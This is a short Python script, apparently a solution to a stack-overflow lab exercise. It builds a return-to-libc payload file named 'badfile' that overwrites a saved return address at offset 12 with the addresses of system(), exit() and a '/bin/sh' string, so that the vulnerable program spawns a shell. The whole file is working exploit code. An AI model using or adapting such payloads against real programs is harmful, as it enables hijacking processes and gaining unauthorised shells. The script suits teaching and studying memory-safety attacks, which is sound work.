#!/usr/bin/python3
from struct import pack

content = bytearray(0xaa for i in range(300))

system_addr = 0x7ffff7e1f290    # address from GDB
exit_addr   = 0x7ffff7e13a40    # address from GDB
sh_addr     = 0x7fffffffe6ad    # address from ./getenv

offset = 12    # for BUF_SIZE = 12

content[offset:offset+8]     = pack("<Q", system_addr)
content[offset+8:offset+16]  = pack("<Q", exit_addr)
content[offset+16:offset+24] = pack("<Q", sh_addr)

with open("badfile", "wb") as f:
    f.write(content)